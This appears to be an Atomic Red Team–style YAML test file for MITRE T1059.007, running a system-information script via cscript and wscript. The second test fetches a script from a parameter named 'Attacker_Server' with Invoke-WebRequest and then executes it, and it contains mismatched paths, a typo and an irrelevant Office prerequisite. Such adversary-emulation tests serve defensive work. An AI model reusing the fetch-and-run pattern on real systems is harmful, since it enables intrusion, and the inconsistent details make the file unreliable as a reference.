attack_technique: T1059.007A
display_name: 'Command and Scripting Interpreter: javascript'
atomic_tests:
- name: Javascript execution to gather local computer information - cscript
  auto_generated_guid: 05c15252-cd7f-11eb-b8bc-0242ac130003
  description: |-
    Javascript execution test, execute javacript via cscript.
    When successful, system information will be written to $env:TEMP\T1059.007.out.txt.
  supported_platforms:
  - windows
  input_arguments:
    javascript:
      description: Path to sample script
      type: String
      default: PathToAtomicsFolder\T1059.007A\src\sys_info.js
  executor:
    command: 'cscript #{javascript} > $env:TEMP\T1059.007A.out.txt'
    cleanup_command: |-      
      Remove-Item $env:TEMP\T1059.007A.out.txt -ErrorAction Ignore
    name: powershell



- name: Javascript execution to gather local computer information - wscript
  auto_generated_guid: 8df71742-cd7f-11eb-b8bc-0242ac130003
  description: |
    Javascript execution test, execute Javascript via PowerShell.
    
    When successful, system information will be written to $env:TEMP\T1059.007.out.txt.
  supported_platforms:
  - windows
  input_arguments:
    javascript:
      description: Path to sample script
      type: String
      default: PathToAtomicsFolder\T1059.007\src\sys_info.vbs
    Attacker_Server:
      descriptoin: Attacker Server URL
      type: URL
      default : www.naver.com
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The 64-bit version of Microsoft Office must be installed
    prereq_command: |
      if (Test-Path #{javascript}) {exit 0} else {exit 1} 
    get_prereq_command: |
      Invoke-WebRequest "#{attacker_server}/atomic-red-team/master/atomics/T1059.007A/src/sys_info.js" -OutFile "$env:TEMP\sys_info.js"
      New-Item -ItemType Directory (Split-Path #{javascript}) -Force | Out-Null
      Copy-Item $env:TEMP\sys_info.js #{javascript} -Force
  executor:
    command: |
      wscript #{javascript} > $env:TEMP\T1059.007.out.txt
    cleanup_command: |
      Remove-Item $env:TEMP\sys_info.js -ErrorAction Ignore
      Remove-Item $env:TEMP\T1059.007.out.txt -ErrorAction Ignore
    name: powershell